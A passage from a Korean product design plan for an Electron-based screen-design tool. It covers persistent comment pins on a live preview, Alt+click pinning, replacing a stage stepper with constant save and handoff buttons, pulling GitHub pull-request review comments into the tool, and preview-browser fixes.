# PLAN — 단계가 아니라 루프: 핀은 화면 위에 살고, 저장·넘기기는 언제나 거기 있다

README 는 지금 배포된 것을 적고, 이 문서는 다음 판이 무엇이고 왜인지를 적는다.
결정은 번호를 달아 코드 주석이 `PLAN D80` 처럼 가리킨다. 앞 판(내장 브라우저,
D64–D77)은 전부 들어갔고 문서는 지워졌다 — 이 문서가 근거로 부르는 앞 판 번호는 §10 에
한 줄씩 풀어 두었다. 이 판의 결정은 **D78–D95** 다. **이 문서가 유일하다. 완료 전에 지우지 않는다.**

목적 한 문장: 이 도구의 일은 "기획서 → 화면 → 검토 → 저장 → 넘기기" 한 줄이
아니라 **만들고 · 찍고 · 고치고 · 다시 찍는 루프**다. 기존 화면을 고치는 일이 새
화면을 만드는 일과 같은 무게여야 하고, 코멘트 핀은 그 루프의 입구이므로 미리보기가
떠 있는 한 언제나 거기 있어야 한다. 저장 · 넘기기는 루프의 단계가 아니라 기획자가
원하는 시점에 누르는 배치 동작이다.

## 0. 진단 — 2026-09-11, 코드 기준

**레일은 아무것도 막지 않는다 — 서사가 문제다.** `deriveStage`(`stage.ts:70`)는
`pendingChanges · branch · handoff · running` 네 사실을 **인덱스 하나**로 접는 순수
함수고, 코멘트 · 저장 · 넘기기는 단계와 무관하게 동작한다(`PageWorkspace.tsx:236` —
대화가 없으면 만들어서 보낸다; `ScreenPanel.tsx:618-642` — 저장 · 넘기기는 `더 보기 ▾`
에도 있다). 그런데 그 접기가 다음 넷을 만든다.

1. **두 축을 한 줄에 놓았다.** `화면 만들기 · 검토·수정` 은 *작업 루프*(대화 + 미리보기 +
   핀, 끝이 없다)고 `저장 · 넘기기 · 반영됨` 은 *배치의 git 상태*(브랜치 → PR → 머지)다.
   한 레일에 두면 "만들기가 끝나야 저장한다"는 waterfall 로 읽힌다.
2. **`화면 만들기` 는 단계가 아니라 빈 상태다.** `stage.ts:113` — 변경 0 · 브랜치 없음일
   때만 나온다. 첫 저장 뒤로는 새 화면을 만들어도 이 단계로 돌아오지 않는다. 기존 화면
   수정과 새 화면 만들기는 같은 행동(턴 하나)인데 이름이 갈라져 있다.
3. **레포 단위인데 화면 단위인 것처럼 말한다.** README:27 "각 화면이 어디까지 왔는지" —
   실제 입력은 레포 전체 `pendingChanges` 하나. 화면 A 반영됨 · 화면 B 수정 중을 레일은
   표현하지 못한다. 상단 바의 상태 칩(`ScreenPanel.tsx:528-535`, 지금 라벨은 `변경 있음 ·
   넘김 · 반영됨` — 새 라벨은 §2 표)이 같은 사실을 이미 말하고 있어 레일은 중복이다.
4. **주 버튼이 변신한다.** `StageBar.tsx:40` — 저장은 review 에서만, 넘기기는 save 에서만,
   새 대화는 create 에서만. 앞 판 D44(스테퍼는 미리보기 열 아래 다섯 단계 레일 + 주 버튼
   하나이고, 저장 · 넘기기는 상단 바에서 빠져 스테퍼로 내려간다)가 못 박은 순간부터 이
   버튼들은 **보이는 유일한 입구**가 단계에 묶였다(메뉴 안의 것은 숨은 입구다). PR 이
   열린 채로 변경이 생기면 레일이 시각적으로 *뒤로* 간다(`stage.ts:82` 우선순위) —
   기획자 눈에는 후퇴다.

**핀은 세 겹으로 사라진다.** ⓐ 모드 토글을 켜야만 보인다(`PreviewHost.tsx:294`,
`preview-preload.ts:145-158` — 모드를 끄면 루트를 떼고 핀을 지운다). ⓑ 턴이 끝나면
지워진다(`ScreenPanel.tsx:409-414`). ⓒ `comments.json` 에는 `text · elementText` 만
남아(`protocol:383-395`, `comments.ts:47-69`) 화면에 다시 찍을 수 없다 — 목록(팝오버)
에만 살아 있다. 미리보기가 산출물인데 코멘트가 산출물 위에 살지 않는다.

**인터랙션 목업은 클릭이 페이지로 가야 한다.** 코멘트 모드는 클릭을 가로채는 모드다
(`preview-preload.ts:220-236`, capture 단계 `preventDefault`). 항상 켜 두면 모달 ·
내비게이션이 죽는다. Figma 프로토타입(C 키) · Vercel 툴바가 모드로 남긴 이유다. 그래서
"항상 보이는 것"(기록된 핀)과 "항상 찍는 것"(모드 없이 찍기)을 분리해야 한다.

**이미 있는 것(그대로 쓴다).** 상단 바 상태 칩 + `최신화` + `더 보기 ▾`(저장 · 넘기기 ·
점검 · 저장 기록 · 변경 버리기 · 코멘트 목록, `ScreenPanel.tsx:581-711`). `새 대화` 입구
다섯: 사이드바 `＋`(`Sidebar.tsx:326`) · 행 메뉴 · 레일 팝오버 · 팔레트(`Palette.tsx:141`)
· `⌘T`(`PageWorkspace.tsx:215`). `comments.json` 저장소와 `comments.record/list/resolve`
(`comments.ts`, `server.ts:1328-1346`). 오버레이의 요소 신원 넷(`component · text · path ·
rect`, `preview-preload.ts:62-72`) — 봉투에는 실려 오는데 기록에서만 버려진다. 새로 고침
때 모드를 다시 알리는 길(`preview-view.ts:236-237`) — 핀 목록도 같은 자리에서 다시 알리면
된다.

**소유자 결정 5 — 추천대로 진행하고, 반대가 없으면 확정.**

| # | 물음 | 추천 |
|---|---|---|
| 1 | 모드 없이 찍는 손짓 | `⌥+클릭`(D79). 우클릭은 페이지의 컨텍스트 메뉴와 겹치고, 롱프레스는 데스크톱에 없다 |
| 2 | 턴이 끝난 뒤 핀 | 남긴다(D78). Claude 가 끝났다는 것과 기획자가 받아들였다는 것은 다르다 — 해결은 기획자가 누른다 |
| 3 | 해결된 핀 | 기본 숨김, 팝오버 `해결된 것 보기` 로 켠다(D78) |
| 4 | 스테퍼 자리 | 비운다 — 미리보기가 그만큼 커진다(D81). 스테퍼 why 줄의 `미해결 코멘트 N` 은 툴바 `💬 코멘트 N` 배지가 이미 세고 있어 잃는 것이 없다 |
| 5 | 화면별 상태 점(선택기 항목마다 `변경 있음 · 넘김 · 반영됨`) | **이 판 밖**(§8). 바뀐 파일 → 화면 대응은 레포의 파일 배치를 도구가 알아야 하거나 브리지가 `files` 를 선언해야 한다 — 둘 다 새 계약이다 |
| 6 | `cds-design.json` 이 없는 레포 | 막지 않고 **Claude 가 준비한다**(D94). 못 하면 지금 문장으로 폴백 |
| 7 | 대화 분기(한 답변에서 갈라진 두 대화) | **이 판 밖**(§8). 클론이 하나라 두 갈래가 같은 파일을 밟는다 — 대화당 worktree 가 먼저. `다시 요청` · `고쳐서 다시 보내기` 는 넣는다(D95) |

## 1. 결정 — 핀은 산출물 위에 산다

| # | 항목 | 결정 |
|---|---|---|
| D78 | 기록된 핀은 화면에 남는다 | `comments.record` 항목에 `element: { component, path, rect }` 를 싣고(봉투 항목의 `element` 가 이미 갖고 있다 — `text` 는 지금처럼 최상위 `elementText` 로 간다) `CommentItem.element?` 로 저장한다(옛 행은 없음 — 자리 없는 코멘트로 읽힌다). 웹이 `commentItems` 가 바뀔 때마다 데스크톱 브리지(`window.cdsDesignDesktop.preview`) 의 `pins(items)` 로 **프로젝트의 전체 목록**을 뷰에 내리고, 뷰는 새로 고침마다 다시 내린다(`cds-overlay:mode` 와 같은 자리). 오버레이는 현재 `[data-screen]`(레포 브리지가 라우트에서 정한 화면 id — 봉투의 `screen` 과 같은 값, 예 `payments/PayFailed`) · `[data-state]`(상태 이름, 없으면 `default`) 로 걸러 그린다 — 라운드트립 없이 화면 전환에 즉시 따른다. 앵커는 `path` → `querySelector`, 실패하면 같은 `component` 중 `elementText` 일치, 그래도 없으면 왼쪽 아래 도킹 목록 `자리를 못 찾은 코멘트 N`(접힘; 항목 클릭 → 같은 말풍선, `해결` 로 치운다). 앵커는 **요소 참조를 쥐지 않고** `MutationObserver(childList · subtree, 100ms 디바운스)` + `scroll` · `resize` 때 다시 푼다 — 핫 리로드가 요소를 갈아 끼워도 핀이 따라간다. 턴이 끝나도 지우지 않는다(`ScreenPanel.tsx:409-414` — 턴이 끝나면 핀 봉투 상태를 비우는 효과 — 삭제). 기록된 핀의 모양은 번호 점(accent), 초안 핀은 지금의 빨강. 점 클릭 → 말풍선: 본문 · `해결` 토글 · 닫기. 해결은 오버레이가 `cds-design.comments.resolve { id, resolved }` 봉투를 올리고 뷰가 `cds-preview:comment-resolve` 로 웹에 건네 `comments.resolve` 를 부른다. 해결된 핀은 기본 숨김, 팝오버(`CommentsPopover.tsx`)의 `해결된 것 보기` 가 켜면 회색으로. **턴이 끝나면 확인을 묻는다**: 그 턴이 실은 핀들은 `확인해 주세요` 로 강조되고(점이 주황, 말풍선이 열려 있다) 말풍선의 버튼은 둘 — `해결`(고쳐졌다) · `다시 요청`(같은 코멘트를 다시 보낸다 — `commentToTurn`, 팝오버의 다시 보내기와 같은 선로). 확인 없이 다른 화면으로 가면 강조는 남고 팝오버 배지가 센다. 핀 루프의 마지막 반 바퀴다 |
| D79 | 찍기는 모드 없이도 된다 | 오버레이 루트는 `DOMContentLoaded` 에 **항상** 붙는다(`pointer-events:none` 이라 페이지는 산다). `click` 캡처는 `mode || event.altKey` 일 때만 개입한다 — `⌥+클릭`(Windows 는 `Alt+클릭`, 같은 `altKey`) 은 어느 모드에서나 `[data-screen]` 안 요소에 초안 핀을 놓고, 그 클릭은 페이지에 닿지 않는다(capture 단계 `preventDefault` — Chromium 의 `⌥+링크 클릭 = 내려받기` 도 여기서 막힌다). 호버 강조는 모드에서는 늘, 모드 밖에서는 `Alt` 를 누르고 있는 동안만(`keydown/keyup`, `blur` 에 해제). 모드 토글(툴바의 `💬 코멘트`, `PreviewHost.tsx:294`)은 남되 뜻이 좁아진다 — **핀만 찍는 모드**(클릭이 화면에 전달되지 않는다). 툴바 툴팁: `핀만 찍는 모드 — 클릭이 화면에 전달되지 않습니다. ⌥+클릭은 언제든 핀을 찍습니다`. 모드를 꺼도 초안 핀은 남는다(`setMode(false)` 가 루트를 떼거나 핀을 지우지 않는다). 초안은 메모리에만 산다 — 새로 고침 · 화면 이동에 사라지는 것은 지금과 같다(D67). 힌트 줄(`preview-preload.ts:345-349`)은 모드에서만. rAF 레이아웃 루프는 호버가 있을 때만 돌고, 핀 배치는 D78 의 이벤트 기반이다 |
| D80 | 핀 하나도 보낸다 | 초안 편집기의 버튼은 `⏎ 보내기`(이 핀만, 즉시 — 항목 하나짜리 봉투, 같은 선로) · `담아 두기`(편집기를 닫고 초안으로 둔다) · `지우기`. 초안이 둘 이상이면 지금의 오른쪽 아래 막대 `수정 요청 N건 보내기` 가 전부 보낸다. 보낸 순간 초안은 지워지고, `comments.record` 가 끝나 웹이 목록을 다시 내리면 같은 자리에 기록된 핀으로 다시 선다(간격 수십 ms 의 깜빡임 — 받아들인다). 화면이 바뀌면 초안은 지금처럼 지운다(D67 — 다른 화면에 남은 초안은 거짓말이다); 기록된 핀은 화면별로 걸러지므로 지울 것이 없다 |
| D86 | 턴 중 보낸 것은 대기 줄로 보인다 | 큐는 이미 있다(`session.ts:523` — 턴 중 `send` 는 SDK 입력 스트림에 밀린다). 그런데 실행 중엔 보내기 버튼이 `중지` 로 바뀌고(`Composer.tsx:1126-1135`) Enter 만 남아, 보낸 것이 지금 끼어드는지 다음 턴인지 표식이 없다 — D80 이 핀을 턴 중에도 보내게 하므로 더 그렇다. 웹이 셈한다: `useSessions` 에 `queued: number` — 실행 중 `send`(핀 봉투 포함)마다 +1, `turn.end` 에 0. 컴포저 위 한 줄 `다음 턴에 보냅니다 · N건 대기`, 핀 토스트도 실행 중이면 `보냈습니다 — Claude 가 일하는 중, 끝나면 이어서 봅니다`. `⌥Enter` = 끊고 보내기(`interrupt()` 뒤 `send`). `중지` 버튼은 그대로. 대기 중인 것을 빼내는 길은 만들지 않는다 — SDK 스트림에서 되찾을 수 없다(§7) |
| D87 | 핀은 본 것을 같이 보낸다 | 봉투 항목의 `element.rect` 는 있다(`preview-preload.ts:70`). 뷰가 `cds-design.comments` 봉투를 웹에 건네기 **전에** 항목마다 `webContents.capturePage(rect)` 로 크롭 한 장을 찍어 `item.shot: { mediaType: "image/jpeg", data }` 로 붙인다 — 긴 변 600px · JPEG q70 · 봉투당 최대 6장(넘으면 앞 6개, 나머지는 텍스트만). 오버레이의 핀 · 말풍선이 같이 찍히므로 세 박자: 뷰 → preload `cds-overlay:capture { on: true }`(루트 `visibility:hidden`) → 캡처 → `{ on: false }`. 웹은 `commentsToTurn` 의 텍스트와 함께 `session.send` 의 `images` 로 보낸다(`session.ts:486-504` 가 이미 받는다 — 기획서 첨부와 같은 선로; `useSessions.sendTurn` · `PageWorkspace.forwardComments` 에 `images` 인자). 채팅의 코멘트 카드(`components.tsx`)는 항목 옆에 썸네일을 그린다. `comments.json` 에는 넣지 않는다 — 기록은 위치(`element`)로 충분하고 캡처는 그 턴의 것이다. Claude 쪽 변경 없음 — 기획자가 본 것을 Claude 가 본다 |
| D89 | 가리킬 것이 없어도 보여 준다 | 오류가 없는데 화면이 이상한 경우 — 흰 화면, 무한 로딩, 통째로 깨진 레이아웃 — 는 배너도(콘솔 오류가 없다) 핀도(가리킬 요소가 없다) 없어 기획자의 길이 채팅에 말로 설명하는 것뿐이다. 프레임 머리에 **`이 화면 Claude 에게 보여 주기`** 하나: 뷰가 전체 `capturePage()`(D87 의 숨김 세 박자 · 긴 변 1200px · JPEG q70) + 현재 라우트 · 상태 + 뷰가 쥔 최근 콘솔 20줄(`preview-view.ts:247` 의 `console-message` 를 링 버퍼로)을 `error` 마커 턴으로 보낸다 — 카드 제목 `화면 보여 주기`, 본문 `이 화면이 이렇게 보입니다. 무엇이 잘못됐는지 보고 고쳐 주세요.` + 기획자가 한 줄 덧붙일 입력(선택). 배너 · 핀 · 이것 셋이 "보이는 것 → Claude" 를 전부 덮는다. **핀이 조용히 죽는 경우도 여기로**: 오버레이는 `[data-screen]` 안의 클릭만 받으므로(`preview-preload.ts:203, 229`) Claude 가 래퍼를 빼먹은 화면에서 `⌥+클릭` 은 무반응이다 — 그때 토스트 `이 화면에는 핀을 붙일 수 없습니다 — 화면 보여 주기로 알려 주세요`. **같은 문제를 두 번 보내는 것은 표식이 있다**: 같은 라우트 · 상태에서 두 번째 `보여 주기` 는 카드에 `두 번째 요청`, 오류 배너는 고치기 턴 뒤 같은 `message` 가 다시 오면 제목이 `아직 같은 오류 · 2번째` — 기획자가 같은 버튼을 모르고 반복하지 않게(웹이 셈한다, 화면이 바뀌면 0) |
| D91 | 턴이 끝나면 Claude 가 본 화면으로 간다 | "고쳤습니다" 뒤 기획자는 어느 화면인지 찾는다 — 선택기를 열거나 Claude 의 답을 읽어야 한다. D61 드라이버의 `screen_open`(`preview-tools.ts:173-187`)이 Claude 가 실제로 연 화면을 알고 있으니 그것을 세션 이벤트로 올린다: `createPreviewTools` 가 `onOpened(route, state)` 콜백을 받고 `session.ts` 가 `{ kind: "preview.opened", route, state }` 를 `events.onEvent` 로 흘린다(`foldEvent` 는 `init` 처럼 블록을 만들지 않는다). 웹은 세션별 `lastOpened` 를 쥐고, `turn.end` 에 **그 턴 동안 기획자가 미리보기를 직접 움직이지 않았으면** `setTarget` 으로 따라간다(직접 움직였으면 대신 토스트 `Claude 는 <화면> · <상태> 를 고쳤습니다 — 보기`). 설정 `대화 → 턴이 끝나면 Claude 가 본 화면으로`(기본 켬). 같은 이벤트가 PiP 라벨을 **참으로** 만든다 — 지금 `Claude가 보는 중 · <화면>` 의 화면은 기획자 뷰의 위치다(`ScreenPanel.tsx:546-559`, 거짓). 이 판의 새 서버 이벤트는 이것 하나다(새 클라이언트 메시지는 D88 의 `comments.reply` 하나) |

```
┌ 미리보기 ──────────────────────────────────────────────────────────────┐
│ 결제 / PayFailed ▾  [기본][비어 있음][오류]        💬 코멘트 2  모바일 태블릿 데스크톱 │
│ ┌──────────────────────────────────────────────────────────────────┐ │
│ │  결제에 실패했습니다                                   ①          │ │  ← 기록된 핀(accent)
│ │  카드 한도를 초과했습니다                                        │ │
│ │  [ 다시 시도 ]②                                                  │ │  ← ⌥+클릭으로 놓은 초안(빨강)
│ │                ┌ 2 · Button ─────────────────────── × ┐           │ │
│ │                │ 비활성일 때 회색이 아니라 테두리만     │           │ │
│ │                │            [지우기] [담아 두기] [⏎ 보내기] │       │ │
│ │                └──────────────────────────────────────┘           │ │
│ │ ▸ 자리를 못 찾은 코멘트 1                                          │ │   ← 왼쪽 아래(오른쪽 아래는 보내기 막대)
│ └──────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────────┘
  ① 클릭 → ┌ 1 · 결제에 실패했습니다 ───────┐
            │ 제목을 두 줄로 줄여 주세요        │
            │ 어제 14:02 · 보냄      [해결] [닫기] │
            └──────────────────────────────────┘
```

## 2. 결정 — 배치 상태는 칩 하나, 동작은 상수

| # | 항목 | 결정 |
|---|---|---|
| D81 | 스테퍼를 지운다 | `StageBar.tsx` · `.stepper*`(`styles.css:3353-3412`) · `stage.ts` 의 `STAGES · Stage · deriveStage` 를 지운다. 미리보기 열 아래는 비운다 — 무대가 그만큼 커진다. 판정은 `delivery.ts#deriveDelivery({ pendingChanges, branch, handoff, running, phase })` 순수 함수 하나로 옮기되, **인덱스를 만들지 않고 사실을 그대로 내놓는다**: `{ state, chip: { label, tone, title }, actions: { save, handoff, check } }`, 각 동작은 `{ enabled, reason }`. 사이드바 표식(`Sidebar.tsx:597`)은 같은 파일의 단어 상수를 계속 빌린다 — 행과 칩이 어긋날 길이 없다 |
| D82 | 동작은 상수다 | 상단 바(`screenpanel__bar`)는 왼쪽부터 **상태 칩 · (다시 그리는 중) · 여백 · `저장` · `개발자에게 넘기기` · `상태 확인` · `최신화` · `더 보기 ▾`**. `저장` 과 `넘기기` 는 언제나 그려지고 조건으로만 잠긴다 — 잠긴 이유는 `title` 한 문장. `상태 확인` 은 PR 이 있을 때만 그린다(없을 때 확인할 것이 없다). `더 보기 ▾` 에서 저장 · 넘기기는 빠지고 `넘기기 전 점검 · 저장 기록 · 변경 버리기 · 코멘트 목록` 이 남는다. 주 스타일은 그 순간 가장 자연스러운 하나에만(`저장` 이 열려 있으면 저장, 아니면 열려 있는 `넘기기`, 둘 다 아니면 없음) — 강조일 뿐 다른 버튼이 사라지지 않는다 |
| D83 | 화면 만들기는 단계가 아니다 | `새 대화` 는 스테퍼의 주 버튼이 아니라 이미 있는 다섯 입구(§0)다 — 새 UI 없음. 스테퍼의 문장 `기획서를 첨부하고 화면을 시켜 보세요.` 는 빈 대화의 컴포저 placeholder 로 옮긴다(`Composer.tsx:1159` 의 `placeholder` 가 대화가 비었을 때 이 문장). README §지금 담긴 것의 스테퍼 항목은 "**루프와 배치**" 항목으로 다시 쓴다: 화면을 만드는 것과 고치는 것은 같은 턴이고, 핀은 미리보기가 떠 있는 한 있으며, 저장 · 넘기기는 원하는 시점의 배치 동작이다 |
| D84 | 병합된 PR 은 다음 사이클로 따라오지 않는다 | 코드에서 찾은 잠복 결함 — 이 판의 표가 성립하려면 먼저 고쳐야 한다. `refreshHandoff` 는 병합 뒤 브랜치만 비우고 `openHandoff` 는 `merged` 그대로 둔다(`repo.ts:992`). 다음 저장의 `ensureCycleBranch` 가 그 값을 새 브랜치에 그대로 넘기므로(`:822`) 두 번째 사이클의 `개발자에게 넘기기` 는 **병합된 PR 을 `updatePullRequest` 로 고치려 한다**(`:902-903`), 그리고 지금의 `deriveStage` · 사이드바 표식은 변경이 있어도 `반영됨` 을 먼저 본다(`stage.ts:74`, `Sidebar.tsx:605`). 고침: `ensureCycleBranch` 가 새 브랜치를 팔 때 `merged` 인 handoff 는 `null` 로 — `setCycle(name, this.openHandoff?.state === "merged" ? null : this.openHandoff)`. `publish-e2e` 가 지금 병합까지만 보고 멈춘다(`:536-549`) — 두 번째 사이클을 이어 붙인다 |
| D88 | 개발자의 코멘트가 도구 안으로 들어온다 | 어휘부터: 나가는 것이 `코멘트`(핀)니 들어오는 것도 **`개발자 코멘트`** 다 — `리뷰` 는 개발자 말이라 화면에 쓰지 않는다. `상태 확인`(D82) 은 이미 PR 을 다시 읽고 `reviews` 로 판정을 낸다(`github.ts:370-386`). 같은 자리에 `GET /pulls/{n}/comments`(인라인 코멘트) 를 더해 `repo.handoffStatus` 응답에 `reviews?: Array<{ id, author, body, path?, line?, at }>` 를 싣는다(본문이 있는 리뷰 자체도 같은 배열로). 웹: `상태 확인` 버튼에 배지 `· 개발자 코멘트 N`(처리 안 한 것), 클릭 → 패널(`CommentsPopover` 클래스 재사용). 기획자가 감당할 상호작용은 **읽지 않아도 되는 버튼**이라 행마다 둘: **`고치기`**(마커 종류 `review` 의 턴 — `turn-marker.ts` 에 `ReviewMarker { kind: "review"; pr: number; author: string; path?: string }`, 카드 제목 `개발자 코멘트에 답하기`; 본문은 다른 마커처럼 파일 경로 없이 — `path:line` 은 카드 `자세히` 에만, D37 · D38 규칙) · **`답하기`**(한 줄 입력 → 데몬 `comments.reply { id, body }` → 인라인이면 `POST /pulls/{n}/comments/{id}/replies`, 리뷰 본문이면 `POST /issues/{n}/comments`). 개발자 코멘트의 상당수가 "고쳐 달라" 가 아니라 **질문**("빈 목록일 때 문구가 뭐예요?")이고 그 답은 Claude 가 아니라 기획자가 안다 — `답하기` 가 없으면 여기서 GitHub 을 열게 된다. 패널 위에 **`모두 Claude 에게`**(처리 안 한 것 전부를 마커 턴 하나로 — 핀의 `수정 요청 N건 보내기` 와 대칭). 처리한 id 는 `settings.handledReviews[pr]`(localStorage) — 사이클이 끝나면 버린다. `changes_requested` 칩의 title 은 `개발자 코멘트 N건 — 상태 확인에서 이어 가세요`. 도구가 기획자 토큰으로 GitHub 에 **쓰는** 첫 자리라 첫 `답하기` 에 한 번 확인(`ConfirmDialog`, `settings.replyConfirmed`). 이것으로 "git 도 GitHub 도 열지 않는다" 의 마지막 구멍이 닫힌다 |
| D90 | 게이트 뒤의 길 | 검사 실패 → Claude 과제(자동, `repo.ts:1564-1579`)까지는 닫혀 있는데 그다음이 열려 있다. **ⓐ 자동 재시도 한 번.** 게이트 카드는 "고치는 동안 기다려 주세요"(`components.tsx:435`)까지만 말하고, Claude 턴이 끝나면 기획자가 알아서 `저장` 을 다시 눌러야 한다 — 아무도 말해 주지 않는다. 웹이 `diff.status { stage: "failed", gate }` 를 받으면 `gateRetry = { action: save|handoff }` 를 세우고, 그 뒤 첫 `turn.end` 에 같은 동작을 **한 번** 다시 부른다(카드에 `다시 저장하는 중…` 줄). 두 번째도 실패하면 멈추고 카드가 `두 번 실패했습니다 — 대화에서 이어 가세요` 로 바뀐다(무한 루프 없음). 기획자가 그 사이 `중지` 를 누르면 재시도도 취소. **ⓑ `pr` 은 Claude 에게 가지 않는다.** `failGate("pr")`(`:909`) 은 PR 열기 실패를 Claude 과제로 보내는데 원인은 토큰 권한 · 브랜치 보호 · 네트워크다 — Claude 가 고칠 수 있는 게 없어 헛돈다. `pr` 은 `onSessionTurn` 없이 `setDiff({ stage: "failed", gate: "pr" })` 만 하고 웹이 `ProgressPanel` 식 안내(`넘기지 못했습니다` + 원문 `자세히` + `설정 열기`)를 넘기기 대화상자 안에 그린다. `push` 는 갈라진다: 거절 사유가 인증 · 권한(`403` · `Permission denied` · `authentication`)이면 안내, 그 외(non-fast-forward 등)는 지금처럼 Claude — `detailOf` 의 문자열로 분기하되 모르면 Claude 쪽(보수적) |
| D92 | 스테퍼가 가르치던 것은 코치 마크가 가르친다 | 레일을 지우면(D81) "다음에 뭘 하나" 를 말하던 자리도 사라진다 — 기획자에게 이 도구의 문서는 화면이다. 첫 실행에 **코치 마크 셋**, 각각 한 문장 + `알겠어요`: ① 미리보기 위 `⌥ 를 누른 채 요소를 클릭하면 코멘트를 달 수 있어요` ② 상단 바 `저장은 언제든 — 잠겨 있으면 마우스를 올려 이유를 보세요` ③ `상태 확인` 이 처음 생길 때 `개발자의 답은 여기로 들어옵니다`. 각각 한 번, `settings.coach: { pin, save, review }`, 설정 → 대화에 `안내 다시 보기`. 순회형 튜토리얼 · 툴팁 폭포는 만들지 않는다 — 셋이 전부다. 그리고 **`⌘/` 단축키 시트**(`Palette` 의 대화상자 클래스): ⌘T 새 대화 · ⌘K 찾기 · ⌘L 주소 · ⌘R 새로 고침 · ⌘[ ⌘] 뒤로 앞으로 · ⌘= ⌘- ⌘0 배율 · `⌥+클릭` 핀 · `⌥Enter` 끊고 보내기 · `⌘,` 설정. 목록은 `menu.ts` 의 템플릿과 같은 상수에서 나온다 — 두 벌이 어긋날 길이 없다 |
| D93 | 넘기기 본문에 코멘트 내역 | PR 본문은 화면 목록만 적는다(`handoff-draft.ts:29-42`). 개발자는 기획자가 **무엇을 왜** 바꿨는지 코드 밖에서 읽을 자리가 없다. `comments.json` 의 이 사이클 항목(브랜치가 생긴 시각 이후, 최대 20건 · 넘으면 `외 N건`)을 `### 수정 요청` 절로: `- [x] 결제 실패 화면 · 오류 — "제목을 두 줄로" (해결)` / `- [ ] … (미해결)`. 화면 id 는 선언된 제목으로, 요소 이름 · 경로는 쓰지 않는다(D38). 데몬이 본문을 만든다(웹의 `handoff-draft` 는 지금처럼 제안만) — `repo.ts#runHandoff` 가 `readComments` 로 붙인다. 이후 저장이 같은 PR 에 쌓일 때 본문도 갱신(`updatePullRequest` 는 이미 부른다, `:903`) |

| `state` | 판정(전부 기계적) | 칩 | `저장` | `개발자에게 넘기기` | `상태 확인` |
|---|---|---|---|---|---|
| `clean` | 변경 0 · 브랜치 없음 · PR 없음 | `변경 없음` | 잠김 `저장할 변경이 없습니다` | 잠김 `먼저 저장해 주세요` | 없음 |
| `unsaved` | 변경 N > 0 | `저장 안 함 N건`(running 이면 `고치는 중 · N건`) — PR 이 있으면 title 에 `저장하면 PR #n 에 쌓입니다` | 열림(running 이면 잠김 `Claude 가 고치는 중 — 끝나면 저장할 수 있습니다`) | 잠김 `저장하지 않은 변경이 있습니다` | PR 이 있으면 |
| `saved` | 변경 0 · 브랜치 있음 · PR 없음 | `저장됨` — title 에 브랜치 이름 | 잠김 `저장할 변경이 없습니다` | **열림** | 없음 |
| `handed` | `handoff.state = open` | `개발자 검토 중 · #n` | 잠김(변경이 생기면 `unsaved`) | 잠김 `이미 넘겼습니다 — 저장하면 같은 PR 에 쌓입니다` | 열림 |
| `changes_requested` | `handoff.state = changes_requested` | `변경 요청 · #n` — title `개발자 코멘트 N건 — 상태 확인에서 이어 가세요`(D88) | 같음 | 같음 | 열림 |
| `merged` | `handoff.state = merged` | `반영됨` — title `다음 저장은 새 사이클을 시작합니다` | 변경이 있으면 열림 | 잠김 | 없음 |

`phase !== "ready"` 면 `deriveDelivery` 는 `null` 을 내고 지금처럼 `ProgressPanel` 이 열을
갖는다. `unsaved` 가 PR 상태보다 앞선다 — 칩은 하나고 "지금 눌러야 할 것" 이 저장이기
때문이다; PR 은 `상태 확인` 버튼이 있다는 사실과 title 로 남는다. `merged` → 저장 → `saved` 전이는
D84 가 있어야 성립한다(그 행 참조).

```
┌ 미리보기 열 ────────────────────────────────────────────────────────────┐
│ ● 저장 안 함 3건   ◌ 다시 그리는 중        [ 저장 ] [개발자에게 넘기기] [상태 확인] ⟳ 최신화  더 보기 ▾ │
│ 결제 / PayFailed ▾  [기본][비어 있음][오류]                     💬 코멘트 2   모바일 태블릿 데스크톱 │
│ ┌────────────────────────────────────────────────────────────────────┐ │
│ │                          (레포의 앱 그대로 — 핀 포함)                  │ │
│ │                                                                    │ │
│ └────────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────────┘
```

1280 폭에서 상단 바가 한 줄이어야 한다. 1100 미만은 `개발자에게 넘기기` → `넘기기`,
`상태 확인` 은 아이콘만.

## 3. 결정 — 브라우저는 브라우저답게

미리보기 뷰는 앞 판에서 브라우저의 뼈대(주소창 · 뒤로 · 앞으로 · 새로 고침 · 오류
배너 · 에뮬레이션)를 얻었지만, 브라우저라면 당연한 손짓 몇 개가 배관만 있거나 없다.
핀(§1)과 파일이 겹치지 않아 1단계 옆에서 반나절이다.

| # | 항목 | 결정 |
|---|---|---|
| D85 | 미리보기 뷰의 손질 다섯 | **ⓐ 로딩이 보인다.** 뷰는 이미 `cds-preview:loading` 을 보내고(`preview-view.ts:243-244`) preload 는 `onLoading` 을 내놓는데(`preload.ts:56`) `NativeHost` 가 구독하지 않는다 — 구독해서 프레임 머리의 새로 고침 버튼이 로딩 중엔 돌고(`aria-busy`), 그때 누르면 **중단**이다(`preview:stop` → `webContents.stop()`, 새 IPC 하나). Next dev 의 첫 컴파일처럼 오래 걸리는 순간에 "멈춘 것 같다" 가 사라진다. **ⓑ 새 창은 보던 곳을 OS 브라우저에 연다.** 지금은 둘이 틀렸다: `window.open(url)`(`PreviewHost.tsx:355`)은 origin 만 열고, 데스크톱의 메인 창에는 `setWindowOpenHandler` 가 없어(`main.ts` — `openExternal` 0건) Electron 기본값대로 **빈 Electron 자식 창**이 뜬다(도구의 preload 까지 물려받는다) — README 의 "미리보기를 브라우저로" 가 거짓이다. 고침: 웹은 `location.path`(없으면 주소창 값)를 붙여 열고, 메인 창은 `webContents.setWindowOpenHandler` 로 미리보기 origin 이면 `shell.openExternal`, 나머지는 `deny`(뷰가 `preview-view.ts:218` 에서 하는 것과 같은 규칙). **ⓒ 단축키는 메뉴가 소유한다.** `main.ts` 가 `Menu.setApplicationMenu` 를 부르지 않아(`:287-296` 에 `autoHideMenuBar` 만) Electron 기본 메뉴의 `reload · forceReload · zoomIn · zoomOut · resetZoom · toggleDevTools` 역할이 산다 — 이 역할들은 **포커스된 창의 webContents** 를 겨누고 뷰는 창의 자식이라, 미리보기에서 ⌘R 을 누르면 도구 UI 가 통째로 새로 고침되고 ⌘+ 는 도구를 키운다. 앱 메뉴를 우리가 만든다(`packages/desktop/src/menu.ts`, 순수 템플릿 빌더 + `Menu.buildFromTemplate`): 편집 메뉴는 기본 역할 그대로(컴포저의 undo · copy · paste 가 그것이다), 보기 메뉴는 **미리보기를 겨눈 항목**으로 — `새로 고침 ⌘R` → `view.reload()`, `뒤로 ⌘[` · `앞으로 ⌘]` → `view.history()`, `주소로 이동 ⌘L` → `cds-preview:key { 